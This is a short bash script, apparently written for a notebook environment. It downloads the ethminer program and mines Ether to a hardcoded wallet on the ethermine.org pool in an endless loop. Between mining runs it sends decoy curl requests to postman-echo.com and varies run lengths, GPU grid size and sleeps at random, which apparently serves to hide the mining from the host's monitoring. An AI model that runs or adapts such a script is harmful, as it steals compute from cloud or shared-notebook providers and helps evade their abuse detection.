

#!/bin/bash
! wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
! tar -xvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
while :
do
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	sleep 2s

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=240
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./bin/ethminer -U --cu-grid-size $z -P stratum1+ssl://0xdfB09d7a6e28E59Dc9DD39aE03F60023bE5E8210@eu1.ethermine.org:5555
	sleep $aaram
	
done